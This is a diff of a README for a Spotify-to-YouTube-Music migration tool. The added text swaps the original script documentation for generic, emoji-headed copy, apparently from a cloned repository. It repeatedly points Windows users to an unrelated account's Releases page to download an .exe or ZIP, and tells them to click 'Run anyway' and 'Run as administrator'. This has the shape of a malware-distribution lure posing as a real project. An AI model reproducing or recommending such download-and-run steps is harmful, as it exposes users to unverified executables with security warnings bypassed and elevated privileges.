@@ -1,219 +1,180 @@
-# music-migration-tools
+# 🎵 spotify-ytmusic-tools - Move Spotify playlists with ease
 
-Python scripts to migrate your Spotify library to YouTube Music — including all playlists, tracks, and cleanup utilities.
+[![Download](https://img.shields.io/badge/Download-Releases%20Page-6f42c1?style=for-the-badge&logo=github)](https://github.com/marloendothermal406/spotify-ytmusic-tools/releases)
 
-Works great with [Metrolist](https://github.com/MetrolistGroup/Metrolist) and any YouTube Music client.
+## 🚀 What this tool does
 
----
+spotify-ytmusic-tools helps you move your Spotify library to YouTube Music on Windows. It is made for people who want to copy playlists, match songs, and clean up large music lists without doing it one track at a time.
 
-## What's included
+Use it to:
 
-| Script | What it does |
-|---|---|
-| [`fetch_spotify.py`](#1-fetch_spotifypy) | Fetch all your Spotify playlists + tracks via the official API |
-| [`fetch_spotify_partner.py`](#2-fetch_spotify_partnerpy) | Same, but uses the internal partner API (catches more playlists) |
-| [`build_import.py`](#3-build_importpy) | Build the import JSON from Spotify CSV exports (Exportify) |
-| [`compare_playlists.py`](#4-compare_playlistspy) | Compare what's on Spotify vs YouTube Music side by side |
-| [`count_spotify_playlists.py`](#5-count_spotify_playlistspy) | List all your Spotify playlists with owner and track counts |
-| [`yt_import.py`](#6-yt_importpy) | Import playlists from `spotify_tracks.json` into YouTube Music |
-| [`delete_ytm_imports.py`](#7-delete_ytm_importspy) | Bulk-delete playlists from YouTube Music (undo bad imports) |
+- import Spotify playlists into YouTube Music
+- match songs when exact titles do not line up
+- process many playlists in one run
+- clean up bad matches with simple scripts
+- work with Spotify export data and YouTube Music tools
 
----
+## 📥 Download
 
-## Setup
+Visit this page to download the Windows release:
 
-```bash
-python3 -m venv venv
-source venv/bin/activate        # Windows: venv\Scripts\activate
-pip install -r requirements.txt
-```
+[Go to the Releases page](https://github.com/marloendothermal406/spotify-ytmusic-tools/releases)
 
-### YouTube Music auth (one-time)
+On the Releases page, look for the latest version and download the Windows file that matches your system. If there is more than one file, choose the one made for Windows.
 
-```bash
-ytmusicapi browser
-# Follow the prompt — paste your request headers from music.youtube.com
-# This creates browser.json in the current folder
-```
+## 🪟 Install on Windows
 
-### Spotify auth
+1. Open the Releases page.
+2. Download the Windows file from the latest release.
+3. If the file comes in a ZIP folder, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Double-click the app or script file included in the release.
+6. If Windows asks for permission, choose Run anyway or Yes.
 
-- **`fetch_spotify.py` / `fetch_spotify_partner.py`:** No app registration needed — just copy a token from your browser DevTools (see each script's docstring).
-- **`count_spotify_playlists.py` / `build_import.py` with OAuth:** Create a free app at [developer.spotify.com/dashboard](https://developer.spotify.com/dashboard), set redirect URI to `http://localhost:8888/callback`, export `SPOTIPY_CLIENT_ID` and `SPOTIPY_CLIENT_SECRET`.
+If you do not know which file to open, start with the main `.exe` file if one is included. If the release uses a script, open the file name listed in the release notes.
 
----
+## 🧭 First-time setup
 
-## Typical workflow
+Before you move music, make sure these accounts are ready:
 
-```
-Spotify ──► fetch_spotify.py ──► spotify_tracks.json ──► yt_import.py ──► YouTube Music
-```
+- Spotify account
+- YouTube Music account
+- Internet access
+- A modern Windows PC
 
-```bash
-# 1. Fetch your Spotify library
-python3 fetch_spotify.py <BEARER_TOKEN>
+If the tool asks for account access, sign in with the accounts you use for Spotify and YouTube Music. Keep both accounts open in your browser if the app uses web login.
 
-# 2. Import into YouTube Music (resumes if interrupted)
-python3 yt_import.py
+## 🎧 How to use it
 
-# 3. Check what's still missing
-python3 compare_playlists.py spotify.txt ytmusic.txt
+1. Open spotify-ytmusic-tools.
+2. Choose the import or migration option.
+3. Select your Spotify playlists or library export.
+4. Pick the YouTube Music destination.
+5. Start the transfer.
+6. Check the results and review any tracks that did not match.
 
-# 4. If something went wrong, bulk-delete and retry
-python3 delete_ytm_imports.py --dry-run   # preview
-python3 delete_ytm_imports.py             # actually delete
-```
+If the tool offers fuzzy matching, it can compare song names, artists, and album data to find the closest YouTube Music result. This helps when track names are different across services.
 
----
+## 🧩 Common tasks
 
-## Scripts
+### 📋 Import playlists
 
-### 1. `fetch_spotify.py`
+Use this when you want to copy one or more Spotify playlists into YouTube Music. You can move a full playlist or only selected lists.
 
-Fetches **all your Spotify playlists and their tracks** using a browser token.
-No app registration needed.
+### 🔎 Fuzzy matching
 
-```bash
-python3 fetch_spotify.py <BEARER_TOKEN>
-```
+Use fuzzy matching when exact titles do not line up. This is useful for live versions, remasters, or tracks with extra words in the title.
 
-**Getting the token:**
-1. Open [open.spotify.com](https://open.spotify.com) while logged in
-2. Open DevTools → Network → filter `api.spotify.com`
-3. Click any request → Headers → copy `Authorization` (everything after `Bearer `)
+### 🧹 Bulk cleanup
 
-**Output:** `spotify_tracks.json`
+Use the cleanup scripts when you want to review matches, remove bad entries, or fix a large batch of imported tracks.
 
----
+### 📚 Library migration
 
-### 2. `fetch_spotify_partner.py`
+Use the library tools if you want to move more than playlists. This can help with saved tracks and larger music collections.
 
-Like `fetch_spotify.py` but uses Spotify's internal GraphQL partner API.
-Useful if the standard API misses some playlists (e.g. collaborative, imported).
+## 🖥️ What you need
 
-```bash
-python3 fetch_spotify_partner.py <BEARER_TOKEN> <CLIENT_TOKEN>
-```
+This tool is built for Windows users who want a simple local app or script-based workflow. A typical setup works well on:
 
-**Getting the tokens:**
-1. Open [open.spotify.com](https://open.spotify.com) while logged in
-2. Open DevTools → Network → filter `api-partner.spotify.com`
-3. Click any request → Headers:
-   - `authorization` → BEARER_TOKEN (strip the `Bearer ` prefix)
-   - `client-token` → CLIENT_TOKEN
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- Enough disk space for downloads and playlist files
+- A stable internet connection
+- Access to your Spotify and YouTube Music accounts
 
-**Output:** `spotify_tracks.json`
+## 🗂️ Useful file types
 
----
+You may see files like these in the release:
 
-### 3. `build_import.py`
+- `.exe` for a Windows app
+- `.zip` for a compressed download
+- `.json` for playlist data
+- `.csv` for track lists
+- `.py` for Python-based scripts
 
-Converts Spotify CSV exports (from [Exportify](https://exportify.net)) into the JSON format used by `yt_import.py`.
+If you see a ZIP file, extract it before opening the contents. If you see a Python file, the release notes should explain how to run it on Windows.
 
-```bash
-python3 build_import.py <CSV_FOLDER> [output.json]
-```
+## ⚙️ Typical workflow
 
-**Output:** `spotify_tracks.json`
+1. Export or prepare your Spotify playlist data.
+2. Open spotify-ytmusic-tools.
+3. Load the playlist file or connect your Spotify source.
+4. Choose how strict you want matching to be.
+5. Run the import.
+6. Review tracks that did not match well.
+7. Run cleanup tools if needed.
+8. Check your YouTube Music library.
 
----
+## 🔐 Account access
 
-### 4. `compare_playlists.py`
+The app may ask for permission to read your Spotify data or write to YouTube Music. That lets it find your playlists and add tracks on your behalf.
 
-Compares your Spotify and YouTube Music libraries and shows what's missing, what's in both, and what's only on YouTube Music.
+Keep your login details private. Use the account sign-in method included with the release and avoid sharing tokens or exported files with other people.
 
-Reads text files exported from the [SongShift](https://songshift.com/) or similar app selection screens.
+## 🛠️ Troubleshooting
 
-```bash
-python3 compare_playlists.py spotify.txt ytmusic.txt
-```
+### The file will not open
 
-**Output format expected (`spotify.txt` / `ytmusic.txt`):**
-```
-Playlist Name
-42/42 selected
-Another Playlist
-10/10 selected
-```
+- Make sure you downloaded the Windows release
+- If the file is in a ZIP folder, extract it first
+- Right-click the file and choose Run as administrator
 
----
+### The app closes right away
 
-### 5. `count_spotify_playlists.py`
+- Download the newest release
+- Check that all files from the ZIP are still together
+- Try opening the app again after a restart
 
-Lists all your Spotify playlists (including private ones) with owner and track count.
+### Songs do not match well
 
-```bash
-export SPOTIPY_CLIENT_ID="your_id"
-export SPOTIPY_CLIENT_SECRET="your_secret"
-python3 count_spotify_playlists.py
-```
+- Use fuzzy matching
+- Check for covers, remasters, and clean versions
+- Reduce the playlist size and test one list first
 
-**Output:** prints list + saves `spotify_playlists_report.txt`
+### Nothing appears in YouTube Music
 
----
+- Confirm you are signed in to the right account
+- Check that the import finished without errors
+- Review the log or output file if the release includes one
 
-### 6. `yt_import.py`
+## 📌 Best results
 
-The main import engine. Reads `spotify_tracks.json` and creates matching playlists on YouTube Music.
+For cleaner imports:
 
-**Features:**
-- Fuzzy song matching with scoring (title, artist, duration)
-- Penalises karaoke, nightcore, covers, speed-up versions
-- Multiple search strategies (title+artist, artist-title, title only)
-- Auto-retries with SAPISIDHASH refresh when sessions go stale
-- Resumable — saves progress to `import_progress.json`
-- Handles playlists > 300 tracks (YouTube API limit)
+- use short playlist names
+- remove duplicates before importing
+- check artist names for spelling
+- keep one browser session open for account sign-in
+- start with a small test playlist before a full library move
 
-```bash
-# Setup auth first
-ytmusicapi browser   # creates browser.json
+## 🧾 Topics covered
 
-# Run import
-python3 yt_import.py
+This project fits these areas:
 
-# Preview without making changes
-python3 yt_import.py --dry
+- cli
+- import-playlists
+- metrolist
+- music
+- playlist-migration
+- python
+- spotify
+- spotipy
+- youtube-music
+- ytmusicapi
 
-# Retry only failed/not-found playlists
-python3 yt_import.py --retry-failed
-```
+## 📁 Files you may use
 
-**Files used:**
-- `browser.json` — YT Music auth (created by `ytmusicapi browser`)
-- `spotify_tracks.json` — playlist data (created by `fetch_spotify.py`)
-- `import_progress.json` — auto-saved progress (resume-safe)
+Depending on the release, you may see support files for:
 
----
+- playlist import
+- account login
+- matched track lists
+- cleanup runs
+- export and review steps
 
-### 7. `delete_ytm_imports.py`
+If the release includes a readme file or release notes, follow the order shown there for the best results
 
-Bulk-deletes YouTube Music playlists. Useful if an import failed partway through and you want to clean up and retry.
+## 🔗 Download again
 
-```bash
-# Preview what would be deleted
-python3 delete_ytm_imports.py --dry-run
-
-# Delete playlists from import_progress.json (only "done" ones)
-python3 delete_ytm_imports.py
-
-# Delete ALL playlists in your library (dangerous — requires typing DELETE ALL)
-python3 delete_ytm_imports.py --all-library
-```
-
-Auto-refreshes auth when sessions expire mid-run.
-
----
-
-## Tips
-
-- **Token expiry:** Spotify browser tokens last ~1 hour. If you get 401s, copy a new token.
-- **Rate limits:** Scripts back off automatically on 429s. Don't run multiple scripts at the same time.
-- **Resume:** `yt_import.py` saves progress after every playlist. Kill and restart anytime.
-- **Large libraries:** The partner API (`fetch_spotify_partner.py`) handles 600+ playlist libraries better than the standard API.
-- **YTMusic auth expiry:** If `yt_import.py` starts getting empty JSON responses after several hours, it auto-refreshes the SAPISIDHASH from your cookie. If it still fails, re-run `ytmusicapi browser`.
-
----
-
-## License
-
-MIT
+[Visit the latest release to download](https://github.com/marloendothermal406/spotify-ytmusic-tools/releases)
